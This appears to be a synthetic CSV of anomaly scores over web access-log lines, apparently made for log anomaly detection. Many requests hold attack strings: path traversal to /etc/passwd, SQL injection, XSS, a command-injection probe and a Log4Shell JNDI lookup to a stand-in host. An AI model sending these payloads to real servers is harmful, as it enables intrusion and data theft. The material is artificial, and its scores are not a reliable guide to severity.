score_content,score_session,score_fused,score_fused_norm,line
24.40692901611328,,24.40692901611328,24.40692901611328,153.74.48.47 - - [10/Jan/2025:12:05:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 5325 "https://twitter.com/" "nikto/2.5.0"
13.195423126220703,,13.195423126220703,13.195423126220703,2.145.8.216 - - [10/Jan/2025:12:05:53 +0100] "PUT /profile HTTP/1.1" 200 18945 "https://news.ycombinator.com/" "curl/7.85.0"
30212.748046875,,30212.748046875,30212.748046875,52.28.191.116 - - [10/Jan/2025:12:05:53 +0100] "OPTIONS /api/products HTTP/1.1" 401 1 "https://news.ycombinator.com/" "curl/7.85.0"
0.26186418533325195,,0.26186418533325195,0.26186418533325195,84.143.101.90 - - [10/Jan/2025:12:05:56 +0100] "GET /assets/app.js HTTP/1.1" 200 17504 "https://news.ycombinator.com/" "nikto/2.5.0"
69.48477935791016,,69.48477935791016,69.48477935791016,93.202.172.230 - - [10/Jan/2025:12:05:56 +0100] "HEAD /search?q=laptop HTTP/1.1" 201 13311 "https://news.ycombinator.com/" "nikto/2.5.0"
94.94782257080078,,94.94782257080078,94.94782257080078,220.91.44.121 - - [10/Jan/2025:12:05:58 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 201 8060 "https://example.com/" "sqlmap/1.7.2#stable"
48.08863830566406,,48.08863830566406,48.08863830566406,108.47.231.209 - - [10/Jan/2025:12:05:59 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 302 11398 "https://news.ycombinator.com/" "nikto/2.5.0"
72.74057006835938,,72.74057006835938,72.74057006835938,112.205.51.250 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /logout HTTP/1.1" 200 11696 "https://twitter.com/" "nikto/2.5.0"
70.76665496826172,,70.76665496826172,70.76665496826172,11.110.13.212 - - [10/Jan/2025:12:06:02 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 14409 "https://www.google.com/" "nikto/2.5.0"
94.88365936279297,,94.88365936279297,94.88365936279297,194.136.91.148 - - [10/Jan/2025:12:06:03 +0100] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 5277 "https://twitter.com/" "nikto/2.5.0"
27.231168746948242,,27.231168746948242,27.231168746948242,55.49.152.227 - - [10/Jan/2025:12:06:03 +0100] "DELETE /api/products HTTP/1.1" 204 3267 "-" "dirb/2.22"
2.778359889984131,,2.778359889984131,2.778359889984131,165.211.121.34 - - [10/Jan/2025:12:06:04 +0100] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 2749 "https://www.google.com/" "sqlmap/1.7.2#stable"
5.800053119659424,,5.800053119659424,5.800053119659424,254.229.55.234 - - [10/Jan/2025:12:06:05 +0100] "POST /cgi-bin/test.cgi HTTP/1.1" 304 810 "https://news.ycombinator.com/" "python-requests/2.31.0"
30189.279296875,,30189.279296875,30189.279296875,91.89.179.36 - - [10/Jan/2025:12:06:07 +0100] "DELETE /api/product?id=123 HTTP/1.1" 403 1015 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30.136688232421875,,30.136688232421875,30.136688232421875,250.98.107.170 - - [10/Jan/2025:12:06:10 +0100] "DELETE /dashboard HTTP/1.1" 302 17701 "https://example.com/" "python-requests/2.31.0"
50.133567810058594,,50.133567810058594,50.133567810058594,250.225.214.231 - - [10/Jan/2025:12:06:11 +0100] "HEAD /about HTTP/1.1" 304 7503 "https://twitter.com/" "dirb/2.22"
27.36236572265625,,27.36236572265625,27.36236572265625,197.63.229.253 - - [10/Jan/2025:12:06:13 +0100] "DELETE /admin HTTP/1.1" 200 1418 "-" "curl/7.85.0"
27.259260177612305,,27.259260177612305,27.259260177612305,127.88.32.178 - - [10/Jan/2025:12:06:16 +0100] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9561 "https://example.com/" "curl/7.85.0"
52.483219146728516,,52.483219146728516,52.483219146728516,69.174.98.70 - - [10/Jan/2025:12:06:17 +0100] "DELETE /search?q=laptop HTTP/1.1" 301 8633 "https://example.com/" "python-requests/2.31.0"
25.43303871154785,,25.43303871154785,25.43303871154785,66.35.84.96 - - [10/Jan/2025:12:06:18 +0100] "DELETE /cgi-bin/test.cgi HTTP/1.1" 200 3650 "https://news.ycombinator.com/" "dirb/2.22"
24.307117462158203,,24.307117462158203,24.307117462158203,196.245.226.101 - - [10/Jan/2025:12:06:19 +0100] "GET /search?q=monitor HTTP/1.1" 200 1925 "https://twitter.com/" "curl/7.85.0"
4.827044486999512,,4.827044486999512,4.827044486999512,138.132.26.43 - - [10/Jan/2025:12:06:20 +0100] "POST /about HTTP/1.1" 200 13330 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.122227668762207,,2.122227668762207,2.122227668762207,253.189.52.33 - - [10/Jan/2025:12:06:22 +0100] "GET /about HTTP/1.1" 200 18626 "https://example.com/" "sqlmap/1.7.2#stable"
95.08883666992188,,95.08883666992188,95.08883666992188,251.21.198.168 - - [10/Jan/2025:12:06:24 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 5471 "-" "python-requests/2.31.0"
0.2444160133600235,,0.2444160133600235,0.2444160133600235,154.62.108.30 - - [10/Jan/2025:12:06:24 +0100] "GET /wp-login.php HTTP/1.1" 201 3676 "https://www.google.com/" "nikto/2.5.0"
0.3240739107131958,,0.3240739107131958,0.3240739107131958,14.223.69.199 - - [10/Jan/2025:12:06:24 +0100] "GET /index.html HTTP/1.1" 204 12301 "https://news.ycombinator.com/" "nikto/2.5.0"
30139.912109375,,30139.912109375,30139.912109375,192.17.31.84 - - [10/Jan/2025:12:06:27 +0100] "GET /assets/app.css HTTP/1.1" 404 267 "https://www.google.com/" "nikto/2.5.0"
103.8005142211914,,103.8005142211914,103.8005142211914,82.240.94.191 - - [10/Jan/2025:12:06:27 +0100] "TRACE /server-status HTTP/1.1" 200 19277 "https://www.google.com/" "nikto/2.5.0"
95.10070037841797,,95.10070037841797,95.10070037841797,190.246.140.253 - - [10/Jan/2025:12:06:30 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 16790 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30189.275390625,,30189.275390625,30189.275390625,251.28.133.157 - - [10/Jan/2025:12:06:33 +0100] "DELETE /search?q=camera HTTP/1.1" 404 852 "https://www.google.com/" "curl/7.85.0"
24.376686096191406,,24.376686096191406,24.376686096191406,30.118.145.143 - - [10/Jan/2025:12:06:33 +0100] "GET /search?q=phone HTTP/1.1" 200 11594 "-" "python-requests/2.31.0"
3.2802515029907227,,3.2802515029907227,3.2802515029907227,110.90.19.32 - - [10/Jan/2025:12:06:33 +0100] "POST /.env HTTP/1.1" 200 18978 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.68403625488281,,49.68403625488281,49.68403625488281,138.41.28.179 - - [10/Jan/2025:12:06:36 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 10464 "https://twitter.com/" "python-requests/2.31.0"
1.9399131536483765,,1.9399131536483765,1.9399131536483765,177.150.107.75 - - [10/Jan/2025:12:06:37 +0100] "GET /dashboard HTTP/1.1" 200 4955 "https://twitter.com/" "python-requests/2.31.0"
129.0598602294922,,129.0598602294922,129.0598602294922,72.153.98.59 - - [10/Jan/2025:12:06:38 +0100] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 17302 "https://twitter.com/" "dirb/2.22"
45.4140510559082,,45.4140510559082,45.4140510559082,252.219.169.34 - - [10/Jan/2025:12:06:41 +0100] "HEAD /.git/config HTTP/1.1" 200 8854 "https://twitter.com/" "dirb/2.22"
0.22157534956932068,,0.22157534956932068,0.22157534956932068,208.131.109.50 - - [10/Jan/2025:12:06:43 +0100] "GET /assets/app.js HTTP/1.1" 200 4165 "https://example.com/" "nikto/2.5.0"
49.61056137084961,,49.61056137084961,49.61056137084961,4.44.253.196 - - [10/Jan/2025:12:06:44 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 3073 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30166.970703125,,30166.970703125,30166.970703125,176.212.3.221 - - [10/Jan/2025:12:06:46 +0100] "DELETE /about HTTP/1.1" 403 1480 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
97.90239715576172,,97.90239715576172,97.90239715576172,210.153.72.135 - - [10/Jan/2025:12:06:47 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 8929 "-" "curl/7.85.0"
102.44892120361328,,102.44892120361328,102.44892120361328,44.5.234.220 - - [10/Jan/2025:12:06:49 +0100] "TRACE /.env HTTP/1.1" 200 4422 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
35.49319076538086,,35.49319076538086,35.49319076538086,247.176.117.195 - - [10/Jan/2025:12:06:52 +0100] "PUT /search?q=laptop HTTP/1.1" 200 9260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.84164428710938,,70.84164428710938,70.84164428710938,240.103.94.143 - - [10/Jan/2025:12:06:52 +0100] "OPTIONS /../../etc/passwd HTTP/1.1" 200 8976 "https://www.google.com/" "sqlmap/1.7.2#stable"
126.231689453125,,126.231689453125,126.231689453125,227.168.233.244 - - [10/Jan/2025:12:06:53 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 14438 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.7552995681762695,,4.7552995681762695,4.7552995681762695,120.62.45.66 - - [10/Jan/2025:12:06:56 +0100] "POST /contact HTTP/1.1" 204 16713 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
50.05110168457031,,50.05110168457031,50.05110168457031,86.62.105.93 - - [10/Jan/2025:12:06:57 +0100] "HEAD /profile HTTP/1.1" 302 18342 "-" "curl/7.85.0"
35.41873550415039,,35.41873550415039,35.41873550415039,124.227.239.222 - - [10/Jan/2025:12:06:57 +0100] "PUT /search?q=headphones HTTP/1.1" 200 9190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.25852423906326294,,0.25852423906326294,0.25852423906326294,243.147.3.217 - - [10/Jan/2025:12:06:57 +0100] "GET /assets/app.js HTTP/1.1" 200 16220 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
24.378528594970703,,24.378528594970703,24.378528594970703,198.180.146.73 - - [10/Jan/2025:12:06:58 +0100] "GET /api/product?id=123 HTTP/1.1" 200 3149 "https://example.com/" "dirb/2.22"
0.06482148915529251,,0.06482148915529251,0.06482148915529251,244.177.203.90 - - [10/Jan/2025:12:07:01 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 5070 "-" "nikto/2.5.0"
24.31615447998047,,24.31615447998047,24.31615447998047,158.1.34.204 - - [10/Jan/2025:12:07:03 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 8045 "https://example.com/" "dirb/2.22"
35.532039642333984,,35.532039642333984,35.532039642333984,105.5.159.20 - - [10/Jan/2025:12:07:05 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 5676 "https://www.google.com/" "curl/7.85.0"
126.34447479248047,,126.34447479248047,126.34447479248047,126.241.225.53 - - [10/Jan/2025:12:07:07 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 2301 "https://example.com/" "dirb/2.22"
24.383045196533203,,24.383045196533203,24.383045196533203,3.222.60.230 - - [10/Jan/2025:12:07:10 +0100] "GET /search?q=phone HTTP/1.1" 200 13759 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11064.76953125,,11064.76953125,11064.76953125,195.14.104.47 - - [10/Jan/2025:12:07:12 +0100] "PUT /search?q=headphones HTTP/1.1" 500 423 "https://example.com/" "nikto/2.5.0"
3.1349618434906006,,3.1349618434906006,3.1349618434906006,46.34.55.60 - - [10/Jan/2025:12:07:13 +0100] "GET /assets/app.js HTTP/1.1" 302 16598 "-" "Wget/1.21.2 (linux-gnu)"
0.2637660503387451,,0.2637660503387451,0.2637660503387451,19.142.42.112 - - [10/Jan/2025:12:07:15 +0100] "GET /assets/app.js HTTP/1.1" 200 18256 "https://news.ycombinator.com/" "dirb/2.22"
27.31907844543457,,27.31907844543457,27.31907844543457,141.179.206.15 - - [10/Jan/2025:12:07:18 +0100] "DELETE /profile HTTP/1.1" 200 14517 "https://example.com/" "python-requests/2.31.0"
46.974063873291016,,46.974063873291016,46.974063873291016,195.113.29.205 - - [10/Jan/2025:12:07:19 +0100] "HEAD /server-status HTTP/1.1" 200 12503 "https://news.ycombinator.com/" "dirb/2.22"
72.7198486328125,,72.7198486328125,72.7198486328125,73.116.82.22 - - [10/Jan/2025:12:07:20 +0100] "OPTIONS /logout HTTP/1.1" 200 5235 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.358701705932617,,27.358701705932617,27.358701705932617,60.179.45.179 - - [10/Jan/2025:12:07:21 +0100] "DELETE /login HTTP/1.1" 200 2130 "https://www.google.com/" "sqlmap/1.7.2#stable"
11029.79296875,,11029.79296875,11029.79296875,44.135.147.78 - - [10/Jan/2025:12:07:22 +0100] "GET /index.html HTTP/1.1" 500 757 "https://news.ycombinator.com/" "curl/7.85.0"
126.34928894042969,,126.34928894042969,126.34928894042969,14.109.178.22 - - [10/Jan/2025:12:07:22 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 11900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.403636932373047,,27.403636932373047,27.403636932373047,209.226.222.52 - - [10/Jan/2025:12:07:22 +0100] "DELETE /about HTTP/1.1" 200 18481 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.0557804107666,,27.0557804107666,27.0557804107666,34.97.36.122 - - [10/Jan/2025:12:07:24 +0100] "POST /search?q=monitor HTTP/1.1" 200 12931 "https://twitter.com/" "dirb/2.22"
24.37042808532715,,24.37042808532715,24.37042808532715,232.173.163.171 - - [10/Jan/2025:12:07:27 +0100] "GET /search?q=laptop HTTP/1.1" 200 17524 "https://twitter.com/" "python-requests/2.31.0"
0.34228649735450745,,0.34228649735450745,0.34228649735450745,212.17.234.98 - - [10/Jan/2025:12:07:29 +0100] "GET /index.html HTTP/1.1" 200 16344 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.67703247070312,,69.67703247070312,69.67703247070312,184.214.91.224 - - [10/Jan/2025:12:07:31 +0100] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12452 "https://www.google.com/" "dirb/2.22"
4.721576690673828,,4.721576690673828,4.721576690673828,168.92.17.97 - - [10/Jan/2025:12:07:32 +0100] "POST /profile HTTP/1.1" 200 3090 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2371491938829422,,0.2371491938829422,0.2371491938829422,184.43.143.172 - - [10/Jan/2025:12:07:32 +0100] "GET /assets/app.css HTTP/1.1" 200 17399 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
3.2496461868286133,,3.2496461868286133,3.2496461868286133,216.229.1.85 - - [10/Jan/2025:12:07:34 +0100] "POST /.env HTTP/1.1" 200 8299 "-" "nikto/2.5.0"
0.23309549689292908,,0.23309549689292908,0.23309549689292908,64.68.108.163 - - [10/Jan/2025:12:07:34 +0100] "GET /assets/app.css HTTP/1.1" 200 15851 "https://www.google.com/" "curl/7.85.0"
3.0269582271575928,,3.0269582271575928,3.0269582271575928,213.19.100.28 - - [10/Jan/2025:12:07:37 +0100] "POST /.git/config HTTP/1.1" 200 14572 "https://twitter.com/" "curl/7.85.0"
30.12175941467285,,30.12175941467285,30.12175941467285,254.27.190.150 - - [10/Jan/2025:12:07:37 +0100] "DELETE /dashboard HTTP/1.1" 301 19606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
49.558677673339844,,49.558677673339844,49.558677673339844,21.102.246.231 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 200 10336 "https://example.com/" "sqlmap/1.7.2#stable"
30190.3046875,,30190.3046875,30190.3046875,125.232.214.36 - - [10/Jan/2025:12:07:40 +0100] "DELETE /search?q=headphones HTTP/1.1" 429 1305 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.679769992828369,,4.679769992828369,4.679769992828369,223.62.216.243 - - [10/Jan/2025:12:07:40 +0100] "POST /api/products HTTP/1.1" 200 5101 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.1089823246002197,,2.1089823246002197,2.1089823246002197,17.18.172.80 - - [10/Jan/2025:12:07:40 +0100] "GET /login HTTP/1.1" 200 13644 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30163.95703125,,30163.95703125,30163.95703125,235.191.155.53 - - [10/Jan/2025:12:07:42 +0100] "GET /search?q=headphones HTTP/1.1" 404 304 "-" "curl/7.85.0"
13.176461219787598,,13.176461219787598,13.176461219787598,144.234.101.1 - - [10/Jan/2025:12:07:43 +0100] "PUT /contact HTTP/1.1" 200 11957 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.06293663382530212,,0.06293663382530212,0.06293663382530212,26.117.43.197 - - [10/Jan/2025:12:07:46 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 4450 "https://www.google.com/" "python-requests/2.31.0"
4.760930061340332,,4.760930061340332,4.760930061340332,60.10.206.94 - - [10/Jan/2025:12:07:48 +0100] "POST /logout HTTP/1.1" 200 1464 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.50662612915039,,35.50662612915039,35.50662612915039,146.130.145.208 - - [10/Jan/2025:12:07:50 +0100] "PUT /search?q=camera HTTP/1.1" 200 13673 "https://example.com/" "sqlmap/1.7.2#stable"
30189.26953125,,30189.26953125,30189.26953125,217.120.231.136 - - [10/Jan/2025:12:07:52 +0100] "DELETE /search?q=camera HTTP/1.1" 404 1298 "https://news.ycombinator.com/" "dirb/2.22"
30186.931640625,,30186.931640625,30186.931640625,146.20.9.87 - - [10/Jan/2025:12:07:54 +0100] "HEAD /login HTTP/1.1" 403 100 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
38.40251922607422,,38.40251922607422,38.40251922607422,198.119.145.110 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/product?id=123 HTTP/1.1" 302 4046 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
38.4013557434082,,38.4013557434082,38.4013557434082,97.39.139.241 - - [10/Jan/2025:12:07:56 +0100] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 302 3569 "https://example.com/" "dirb/2.22"
103.9366683959961,,103.9366683959961,103.9366683959961,184.246.225.176 - - [10/Jan/2025:12:07:59 +0100] "TRACE /profile HTTP/1.1" 200 3327 "https://example.com/" "dirb/2.22"
24.36561393737793,,24.36561393737793,24.36561393737793,163.155.240.86 - - [10/Jan/2025:12:08:00 +0100] "GET /search?q=laptop HTTP/1.1" 200 15687 "https://www.google.com/" "curl/7.85.0"
1.914760708808899,,1.914760708808899,1.914760708808899,133.178.125.94 - - [10/Jan/2025:12:08:03 +0100] "GET /phpmyadmin HTTP/1.1" 204 8869 "https://www.google.com/" "sqlmap/1.7.2#stable"
95.1500473022461,,95.1500473022461,95.1500473022461,85.213.208.15 - - [10/Jan/2025:12:08:03 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17015 "-" "sqlmap/1.7.2#stable"
97.89672088623047,,97.89672088623047,97.89672088623047,16.242.221.193 - - [10/Jan/2025:12:08:04 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 301 13482 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.089866638183594,,27.089866638183594,27.089866638183594,221.106.175.44 - - [10/Jan/2025:12:08:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 301 14812 "https://news.ycombinator.com/" "dirb/2.22"
27.316913604736328,,27.316913604736328,27.316913604736328,188.95.82.106 - - [10/Jan/2025:12:08:04 +0100] "DELETE /contact HTTP/1.1" 204 16236 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2314894199371338,,0.2314894199371338,0.2314894199371338,230.130.197.218 - - [10/Jan/2025:12:08:05 +0100] "GET /assets/app.css HTTP/1.1" 200 15256 "https://news.ycombinator.com/" "nikto/2.5.0"
30.22754669189453,,30.22754669189453,30.22754669189453,182.228.158.70 - - [10/Jan/2025:12:08:08 +0100] "DELETE /contact HTTP/1.1" 304 11749 "https://www.google.com/" "curl/7.85.0"
2.0563292503356934,,2.0563292503356934,2.0563292503356934,149.224.246.61 - - [10/Jan/2025:12:08:08 +0100] "GET /contact HTTP/1.1" 200 293 "https://example.com/" "nikto/2.5.0"
45.67805480957031,,45.67805480957031,45.67805480957031,94.143.137.89 - - [10/Jan/2025:12:08:10 +0100] "HEAD /.env HTTP/1.1" 204 18961 "-" "dirb/2.22"
97.9186782836914,,97.9186782836914,97.9186782836914,77.75.44.144 - - [10/Jan/2025:12:08:10 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 304 8144 "-" "Wget/1.21.2 (linux-gnu)"
2.0784032344818115,,2.0784032344818115,2.0784032344818115,240.218.25.128 - - [10/Jan/2025:12:08:12 +0100] "GET /logout HTTP/1.1" 200 16313 "https://news.ycombinator.com/" "curl/7.85.0"
3.075779914855957,,3.075779914855957,3.075779914855957,36.102.175.159 - - [10/Jan/2025:12:08:12 +0100] "GET /assets/app.css HTTP/1.1" 301 11274 "https://www.google.com/" "dirb/2.22"
13.22707462310791,,13.22707462310791,13.22707462310791,193.88.154.82 - - [10/Jan/2025:12:08:12 +0100] "PUT /about HTTP/1.1" 201 5306 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
52.50398254394531,,52.50398254394531,52.50398254394531,74.56.170.243 - - [10/Jan/2025:12:08:12 +0100] "DELETE /search?q=router HTTP/1.1" 302 8972 "https://news.ycombinator.com/" "dirb/2.22"
16.061216354370117,,16.061216354370117,16.061216354370117,205.238.34.33 - - [10/Jan/2025:12:08:14 +0100] "PUT /logout HTTP/1.1" 301 9605 "https://example.com/" "python-requests/2.31.0"
2.30956768989563,,2.30956768989563,2.30956768989563,152.48.25.184 - - [10/Jan/2025:12:08:17 +0100] "GET / HTTP/1.1" 204 11180 "https://twitter.com/" "dirb/2.22"
38.45683288574219,,38.45683288574219,38.45683288574219,131.175.60.114 - - [10/Jan/2025:12:08:18 +0100] "PUT /api/product?id=123 HTTP/1.1" 304 8504 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
129.22409057617188,,129.22409057617188,129.22409057617188,24.121.37.156 - - [10/Jan/2025:12:08:18 +0100] "TRACE /api/product?id=123 HTTP/1.1" 301 18891 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.10125532746315002,,0.10125532746315002,0.10125532746315002,121.116.95.241 - - [10/Jan/2025:12:08:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17051 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.34837958216667175,,0.34837958216667175,0.34837958216667175,10.87.150.237 - - [10/Jan/2025:12:08:22 +0100] "GET /index.html HTTP/1.1" 200 18730 "https://www.google.com/" "dirb/2.22"
30186.931640625,,30186.931640625,30186.931640625,88.76.35.102 - - [10/Jan/2025:12:08:24 +0100] "HEAD /admin HTTP/1.1" 400 24 "https://www.google.com/" "dirb/2.22"
47.10627746582031,,47.10627746582031,47.10627746582031,86.180.251.188 - - [10/Jan/2025:12:08:24 +0100] "HEAD /api/products HTTP/1.1" 200 11431 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.279726028442383,,24.279726028442383,24.279726028442383,62.84.9.253 - - [10/Jan/2025:12:08:24 +0100] "GET /search?q=headphones HTTP/1.1" 200 11605 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.250433921813965,,13.250433921813965,13.250433921813965,213.145.55.33 - - [10/Jan/2025:12:08:27 +0100] "PUT /about HTTP/1.1" 200 546 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3091740012168884,,0.3091740012168884,0.3091740012168884,75.77.52.175 - - [10/Jan/2025:12:08:27 +0100] "GET /index.html HTTP/1.1" 200 5530 "https://www.google.com/" "sqlmap/1.7.2#stable"
30141.90625,,30141.90625,30141.90625,80.184.3.204 - - [10/Jan/2025:12:08:30 +0100] "GET / HTTP/1.1" 403 1227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.0212173461914,,95.0212173461914,95.0212173461914,229.29.14.142 - - [10/Jan/2025:12:08:30 +0100] "OPTIONS /search?q=camera HTTP/1.1" 200 7193 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.674306869506836,,4.674306869506836,4.674306869506836,119.120.172.57 - - [10/Jan/2025:12:08:33 +0100] "POST /api/products HTTP/1.1" 200 2296 "-" "sqlmap/1.7.2#stable"
2.9918320178985596,,2.9918320178985596,2.9918320178985596,87.232.4.195 - - [10/Jan/2025:12:08:36 +0100] "POST /.git/config HTTP/1.1" 200 2860 "https://twitter.com/" "nikto/2.5.0"
3.097151279449463,,3.097151279449463,3.097151279449463,227.43.167.139 - - [10/Jan/2025:12:08:39 +0100] "GET /assets/app.css HTTP/1.1" 302 11841 "https://example.com/" "curl/7.85.0"
94.98255157470703,,94.98255157470703,94.98255157470703,174.99.79.23 - - [10/Jan/2025:12:08:42 +0100] "OPTIONS /search?q=headphones HTTP/1.1" 200 19502 "https://example.com/" "dirb/2.22"
16.073537826538086,,16.073537826538086,16.073537826538086,19.135.120.132 - - [10/Jan/2025:12:08:43 +0100] "PUT /logout HTTP/1.1" 301 13673 "https://www.google.com/" "curl/7.85.0"
30175.017578125,,30175.017578125,30175.017578125,205.190.106.32 - - [10/Jan/2025:12:08:43 +0100] "PUT /search?q=camera HTTP/1.1" 401 853 "https://example.com/" "sqlmap/1.7.2#stable"
